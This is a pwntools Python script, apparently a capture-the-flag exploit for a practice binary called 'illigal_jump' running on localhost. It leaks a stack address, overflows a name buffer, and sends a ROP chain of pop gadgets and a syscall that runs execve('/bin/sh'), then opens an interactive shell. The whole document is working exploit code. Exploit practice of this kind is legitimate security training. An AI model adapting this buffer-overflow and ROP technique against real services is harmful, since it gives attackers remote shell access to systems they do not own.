from pwn import *
context.arch = 'amd64'
context.terminal = ['konsole', '-e']

name_buffer = 0x7fffffffe2b0
stored_rbp = 0x7fffffffe300

# proc = process("./illigal_jump");
proc = remote("localhost", 9006)

def set_buf():
    proc.sendlineafter("option:", b"1")
def jump_buffer():
    proc.sendlineafter("option:", b"2")
def hello():
    proc.sendlineafter("option:", b"3")

set_buf();
hello();

proc.recvuntil('name at ')
name_address = int(proc.recvuntil('\n'), 16)

pop_rax = 0x000000000044ead7
pop_rdi = 0x0000000000401811
pop_rsi = 0x0000000000407fae
pop_rdx = 0x000000000040174f
syscall = 0x000000000040120e

payload = b""
payload += b'/bin/sh\0'
payload += b'x' * (stored_rbp - name_buffer - len(payload) - 0x8)
payload += pack(pop_rax);
payload += pack(59);
payload += pack(pop_rdi)
payload += pack(name_address)
payload += pack(pop_rsi)
payload += pack(0)
payload += pack(pop_rdx)
payload += pack(0)
payload += pack(syscall)

# gdb.attach(proc, "b jump_buffer")

proc.sendline(payload)

jump_buffer()

proc.interactive();


